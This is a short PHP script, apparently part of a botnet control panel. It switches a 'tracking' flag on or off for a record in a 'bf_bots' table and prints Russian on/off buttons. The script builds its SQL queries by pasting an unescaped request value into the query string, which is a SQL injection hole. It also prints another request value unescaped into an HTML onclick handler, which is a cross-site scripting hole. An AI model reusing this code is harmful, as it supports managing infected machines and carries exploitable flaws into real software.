<?php

if(!empty($Cur['id'])){	$bot = $mysqli->query('SELECT id,tracking FROM bf_bots WHERE (id = \''.$Cur['id'].'\') LIMIT 1');
	if($Cur['id'] == $bot->id){		if($bot->tracking == 1){			$mysqli->query('UPDATE bf_bots SET tracking = \'0\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
			print('Выключено <input type="button" value="Включить" onclick="set_tracking(\''.$bot->id.'\', \''.$Cur['str'].'\');" />');
		}else{			$mysqli->query('UPDATE bf_bots SET tracking = \'1\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
			print('Включено <input type="button" value="Выключить" onclick="set_tracking(\''.$bot->id.'\', \''.$Cur['str'].'\');" />');
		}
	}else{		print('Ошибка');
	}
}else{	print('Ошибка');
}

?>